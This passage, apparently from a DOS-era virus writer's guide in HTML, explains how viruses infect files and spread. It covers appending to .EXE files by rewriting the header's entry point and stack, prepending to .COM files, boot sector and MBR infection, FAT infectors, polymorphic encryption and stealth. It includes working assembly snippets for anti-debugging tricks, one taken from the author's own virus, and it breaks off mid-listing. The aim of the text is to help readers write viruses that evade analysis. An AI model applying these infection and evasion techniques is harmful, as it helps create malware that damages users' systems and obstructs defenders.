&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>greeting<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4Ch</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
greeting&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Hello, world!$'</span><br/>
end &nbsp; &nbsp; Hello<br/>
&nbsp;</div>
<p>This source code compiles to a 25 byte .COM file. With a proper .EXE header attached, it is 57 bytes long. Following is a hex dump labelling the different parts of the .EXE header, and the original .COM file image. (Note: There is no practical reason for doing this. The converted .COM file strategy was only chosen for simplicity's sake.)</p>
<table summary="EXE header">
<tr><th>Offset</th><th>Dump</th><th>Description</th></tr>
<tr><td>00</td><td>5A4D</td><td>'MZ' .EXE header signature.</td></tr>
<tr><td>02</td><td>0039</td><td>Program bytes remaining in last 512 byte page.</td></tr>
<tr><td>04</td><td>0001</td><td>Number of 512 byte pages needed for .EXE file &amp; header</td></tr>
<tr><td>06</td><td>0000</td><td>Number of relocatable items</td></tr>
<tr><td>08</td><td>0002</td><td>Header size in paragraphs</td></tr>
<tr><td>0A</td><td>0FFE</td><td>Minimum extra paragraphs needed</td></tr>
<tr><td>0C</td><td>FFFF</td><td>Maximum extra paragraphs needed</td></tr>
<tr><td>0E</td><td>FFF0:FFFE</td><td>Stack segment</td></tr>
<tr><td>12</td><td>0000</td><td>Checksum of file (optional)</td></tr>
<tr><td>14</td><td>FFF0:0100</td><td>Initial CS:IP (org 100h)</td></tr>
<tr><td>18</td><td>001C</td><td>Offset of relocation table</td></tr>
<tr><td>1A</td><td>0000</td><td>Overlay number (0 = not an overlay)</td></tr>
<tr><td>1C</td><td>000000000</td><td>Relocation table</td></tr>
<tr><td>20</td><td>B4 09</td><td>MOV AH,9</td></tr>
<tr><td>22</td><td>BA 010B</td><td>LEA DX,GREETING</td></tr>
<tr><td>25</td><td>CD 21</td><td>INT 21h</td></tr>
<tr><td>27</td><td>B4 4C</td><td>MOV AH,4Ch</td></tr>
<tr><td>29</td><td>CD 21</td><td>INT 21H</td></tr>
<tr><td>2B</td><td>...</td><td>Hello, world!$</td></tr>
</table>
 
<p>A standard .COM file can be directly planted in memory as is, then executed from beginning to end. Because .EXE files often use more than one segment, and can start off on any given offset, they must be processed differently. The .EXE header contains the necessary data needed by DOS to set up the executable properly in memory, how much memory is needed, where to begin the actual execution, and much more. The signature 'MZ' at the beginning of an executable indicates to DOS that there is an .EXE header present.</p>
<p>Offset 0Eh of the header tells DOS where to place the stack. Since this is actually a disguised .COM file, the stack begins at the last byte of the code segment. Offset 14h is the initial CS:IP, or the pointer to the beginning of the executable code. These two sets of values are important in .EXE appending viruses.</p>
<p>To infect an .EXE file, the virus must first store the above values within its body, then append a copy of itself to the end of the victim. The initial CS:IP is then modified to point to the virus instead of the code segment. Often the stack segment is located at the end of the executable file, and must also be moved. Forgetting to relocate the stack's position will almost invariably result in a system crash, (if not, it <em>will</em> cause faulty infections that crash) as the virus code will be overwritten with garbage bytes.</p>
 
<p>If the host is subsequently executed, the virus will be executed first. When the virus is finished running, the stack and initial CS:IP are replaced, and the virus jumps to the original code to execute it as if nothing had changed. Trace through the <strong>Lezbo</strong> virus in chapter 6 to see this in action.</p>
<p>Often the .EXE header is modified to provide virus identification. The usual modifications occur in the checksum value, which has fallen from normal usage, and in the third and forth bytes. These bytes can be altered without harming the .EXE file, even though the values will then be incorrect.</p>
<h4><a name="ph16"></a>Prepending .COM Viruses</h4>
<p>Only files with the .COM file format can be infected using the prepending method. This is because the victim is written to the end of the virus code instead of the virus being appended to the end of the victim. The virus then saves a record of the original file length before copying itself to the disk.</p>
<p>When an infected program is executed, the prepended virus code is executed in its place. The virus first loads itself to a different segment. The next segment always starts 64 Kilobyes after the entrypoint of the file, and thus safely clears the 64 Kilobyte size limit imposed on .COM files. From there, it can rewrite the host file to its
 
original offset. The virus then finishes execution before jumping to offset 0100h; the host's original entry point.</p>
<p>Because of their simplicity, prepending viruses are often very compact. The <strong>DOS 7</strong> in chapter 6 is a prepending virus.</p>
<div align="center">
<img src="img/vkj00/fig5.gif" alt="Figure XX. The prepending virus: Infection and execution"/>
<p><strong>Figure XX. The prepending virus: Infection and execution</strong> (c)1993 PC Scavenger, Used by permission</p>
</div>
 
<h4><a name="ph17"></a>Boot Sector/MBR Viruses</h4>
<p>The boot sector and master boot record are not visible to users without access to special programmer's tools. A debugger program, like DEBUG.COM set up in DOS, is the bare minimum requirement for exploring these sections of a disk. Sector editors often prove more helpful. A disassembler program will make the code much easier to comprehend.</p>
<p>The boot sector is always the first sector found on a floppy disk. It is also found on hard drives, but in a different location. The main role of the boot sector is to initialize system memory before loading the operating system files.</p>
<p>Hard drives have two different types of boot sectors. Besides the normal boot sectors in each partition, there is the Master Boot Record (MBR). Its duty includes setting up the disk partition information in DOS memory, so that the hard drive can function properly. All hard drives can be partitioned in a variety of ways. The information needed to read them is stored in the Partition Table at the end of the MBR.</p>
<p>To see how a partition table operates, see the PC Scavenger Anti-Virus Master Boot Record on page .</p>
<p>Because these files are hidden outside of DOS reach, and are the primary files to gain control of the system,
 
Boot sectors and MBR's are particularly vulnerable to viral infection.</p>
<p>The standard method of infection is to move the original boot sector or MBR to another sector on the disk, then replace it with a copy of the virus code. In the case of an MBR infection, it is imperative that offsets 1BEh onward are preserved in the virus code. This is the drive's partition information. Without this information appearing in the proper location, the drive may not function properly. System Information programs will also report false information when determining drive specs.</p>
<p>The <strong>Michelangelo</strong> virus is very careful to maintain the system's integrity by placing the partition tables at the proper location after the virus code. The source code to this virus appears in Chapter Six. Its functions are well documented.</p>
 
<h4><a name="ph18"></a>File Allocation Viruses</h4>
<p>The <strong>Dir ][</strong> virus introduced a new infection technique. Because of its dependency on DOS version, FAT infection has not been explored very deeply.</p>
<p>Instead of actually infecting executable files, this type of virus, erroneously entitled a Directory Infector, only places one copy of itself on an infected disk or diskette. When a file is executed, the File Allocation Table (FAT) is altered in such a way that it points to the virus instead of the file being requested. The virus keeps a copy of the original allocation information within its own body.</p>
<p>When execution of an infected file is attempted, the virus is run instead. Once the virus is finished, it passes control to the requested file. The user is often completely oblivious to the infection.</p>
<h3><a name="ph2"></a>Simbiotic Relationships</h3>
<p>The <strong>10 K</strong> virus</p>
 
<h2><a name="pi"></a>Advanced Coding Techniques</h2>
<p>Some virus writers go through extreme pains to avoid detection or disassembly of their creations. Virtually all of the techniques have some commercial value, especially for copyright protection. Following are key techniques used within viruses, together with information about their implementation and success potential.</p>
<h3><a name="pi1"></a>Encryption</h3>
<p>Encryption began as a method to make the virus less obvious to those employing text or hex editors to view infected files. Other than that, direct encryption techniques serve no other purpose. A good debugger will be able to decrypt the virus, then carry out a straight disassembly of it.</p>
<p>Later, variable encryption keys were used to make scan strings more difficult to formulate. This did not prove very beneficial. The anti-virus programmers started making scan strings from the encryption engine itself.</p>
<p>The next stage was a little more effective. Virus writers began incorporating encryption engines with replaceable code. These became known as mutating viruses. Again, the anti-virus community fought back, providing
 
algorithmic scanning, which was equally able to detect these viruses.</p>
<p>The most recent development is the polymorphic virus. The virus contains a kernel which writes an entirely new encryption routine at every infection. This procedure virtually eliminates the constant bytes and earlier detectable algorithms created by the engine.</p>
<p>It does seem, however, that polymorphic engines are by far the most difficult to detect. These engines require much study and testing before a successful detection scheme can be developed. Making matters worse, changing a few bytes of the engine around can instantly cripple the virus scanner so that the code it creates uses different encryption strategy.</p>
<p>The <strong>Proto 3</strong> virus is a polymorphic virus. The source code is listed at the end of Chapter Six, and a debug script is provided in the appendices. The virus is fully functional, but has been purposely written to only run on 386+ processors. This is simply to avoid any epidemics.</p>
<h3><a name="pi2"></a>Stealth Techniques: Advanced Hide-and-go-Seek</h3>
<p>Stealth viruses exploit various operating system functions to remain as invisible as possible. Many of these techniques make it virtually impossible to find a virus if it is in memory.</p>
 
<p>One technique is to hide the file size increase in an infected program. There are initially two methods for accomplishing this.</p>
<p>One technique is directly to alter the directory listing to hide the size as well as time and date stamp changes. This will cause errors to be noted when CHKDSK is used. As a result, direct manipulation of the file listing is not often incorporated.</p>
<p>The alternative is to mark files and then only change the size information as a DIR command is executed. The most common method is to change the file's time stamp to 62 seconds. The seconds are not seen when the directory is viewed, so this is relatively safe. Files with the 62 second date stamp can then have the size increase deleted in memory instead of physically on the disk. This only works if the virus is in memory.</p>
<p>One way to make sure the virus is in memory is to immediately make sure COMMAND.COM is infected each time the virus is activated. This is by far the most popular virus stealth technique. The <strong>Lezbo</strong> virus, listed in Chapter Six, demonstrates various stealth techniques such as this.</p>
<p>Viruses also require a certain amount of memory when they are executed. Some viruses actually rewrite the system information to hide the memory decrease. Others place
 
themselves in an upper memory block, or in an obscure memory location to avoid affecting the available memory at all.</p>
<p>Some boot sector/MBR viruses utilize a different sort of stealth. Because the original sector is moved during these infections, it is possible to hide this by providing counterfeit images.</p>
<p>For instance, if the user attempts to rewrite the boot sector, the virus can intervene, and redirect the writing to another sector on the disk. While the program thinks it has successfully overwritten a new sector 0, it may have actually overwritten it to sector 11. If the user attempts to view sector 0 with a sector editor, the virus will again kick in, and redirect the program's attention to sector 11. The user then sees the legitimate boot sector instead of the viral code. This is the most common stealth technique employed in boot sector type viruses.</p>
<h3><a name="pi3"></a>Anti-Hack Routines</h3>
<p>In the virus industry, anti-hack routines do not serve any real purpose. They are used, perhaps, to keep the original source code from prying eyes, or to flaunt one's programming prowess.</p>
<p>One method is to place the stack pointer over top the code directly over top certain key code areas, then push some value onto the new stack. Under normal circumstances,
 
this will have no effect on program execution. Under a debugger, the file will become corrupt, and will almost invariably crash.</p>
<p>The ensuing example demonstrates this technique:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model&nbsp; tiny&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;use Debugger to Trace</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">.data</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; this code through.</span><br/>
<br/>
text&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'DEBUG Me!$'</span><br/>
<br/>
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<br/>
begin<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FE05h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9E03h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>text<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span>intrs&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;use stack to corrupt file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">43h</span><br/>
<br/>
intrs<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;stack will be moved to here</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; begin<br/>
&nbsp;</div>
<p>The first two lines of code need to be explained. Jumping back 2 bytes from the position of the JMP statement will put you over the 0FE05h. If you trace this with a debugger, this code will be interpreted as MOV AH,xx. The xx value comes from the SUB command. The $-2 is translated as a CLD command, and has no effect on most operations.</p>
<p>Because AX will be a different value than previously expected, adding or subtracting another number to it will produce a number other than that which a disassembler will
 
report. In this case, subtracting 9E03h will produce the number 4C00h, the function DOS uses to terminate the program execution. This number is pushed onto the stack. Subtracting 43h from AH will produce 09h, the DOS Print_String function. These results may not be visually obvious. Run this code through a debugger to fully comprehend what is happening here.</p>
<p>Next, the stack is placed over top the code immediately in front of the code being executed. Because the debugger uses the same stack as the file being debugged, it will immediately corrupt the file.</p>
<p>It is interesting that the PUSH AX does not corrupt the file as it executes. The reason can be explained better through the code snippet below.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model&nbsp; tiny&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;(T)race first line,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">.data</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;then type (G)o</span><br/>
<br/>
text&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Don'</span><span style="color: #7f007f;">'t DEBUG Me.$'</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<br/>
begin<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span>offset intrs <span style="color: #339933;">-</span> <span style="color: #ff0000;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span> &nbsp; <span style="color: black; font-style: italic;">;change the AH val for INT 21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>text<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4Ch</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;drop to DOS. (Print_String if debugged)</span><br/>
<br/>
intrs<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">20h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; begin<br/>
&nbsp;</div>
 
<p>When executed, this code simply drops to DOS. When traced under a debugger, it prints a message to the screen instead. The reason will not be obvious by looking through the code, nor by using a debugger.</p>
<p>Intel systems (IBM compatable PC's) have what is called a <em>prefetch queue</em>. Before code is executed, a group of bytes are loaded into this queue. This is to increase the speed of file execution. The above sources exploit this function by making use of the code that is already loaded into the prefetch queue. Any modifications made to the nearby code do not affect the file's execution if the bytes are already pre-loaded. The reason this works is because debuggers bypass the prefetch queue. Here is one more example of this trick. Which message will be printed under the debugger?</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model&nbsp; tiny&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Trace through this</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">.data</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;code with a debugger</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;&amp; type (G) at INT 21</span><br/>
<br/>
text&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Don'</span><span style="color: #7f007f;">'t DEBUG Me.$'</span><br/>
bug &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">7</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'I said NOT TO DEBUG ME! Are you slow?$'</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<br/>
begin<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span>offset intrs <span style="color: #339933;">-</span> <span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>offset bug&nbsp; <span style="color: black; font-style: italic;">;change message</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>text<br/>
<br/>
intrs<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">20h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; begin<br/>
&nbsp;</div>
 
<p>This method can be used to alter the location that the program jumps to. This will cause the debugger to stray down the wrong path. In this manner, this technique is incorporated into the <strong>DOS 7</strong> virus in chapter 6.</p>
<p>Another method is to patch the timer interrupt. By adding a flag to a loop, which is set when the timer clicks, one can effectually halt the computer. This happens because the timer interrupt is disabled under debuggers. While the flag is not set, the program runs into an infinite loop.</p>
 
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model&nbsp; tiny<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<br/>
begin<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3508h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;trap the timer interrupt</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span>int_8<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span>int_8<span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset prog_start<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">25h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;program is now part of timer interrupt</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
<br/>
done<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; flag<span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;if the flag isn't set, loop</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; done<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;clean up and exit</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">20h</span><br/>
<br/>
flag&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;this is the flag we're interested in</span><br/>
int_8 &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ?<br/>
text&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'Don'</span><span style="color: #7f007f;">'t DEBUG Me!$'</span><br/>
<br/>
prog_start<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">9</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>text<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; flag<span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;This flag gets set when the timer goes off</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span>offset int_8<span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; begin<br/>
&nbsp;</div>
<p>A particular favourite technique of the author's is embodied in the <strong>DOS 7</strong> virus. Interrupt 0, 4, 5, 6, or any other CPU generated interrupt can be trapped so that it points to the segment and offset of the code being executed. If this code is well buried inside other routines, it is extremely difficult to determine what the routine does, or
 
what will happen with it. Here is a scaled down version of the code used in <strong>DOS 7</strong>.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model&nbsp; tiny<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; org &nbsp; &nbsp; <span style="color: #ff0000;">100h</span><br/>
<br/>
trick<span style="color: #339933;">:</span><br/>
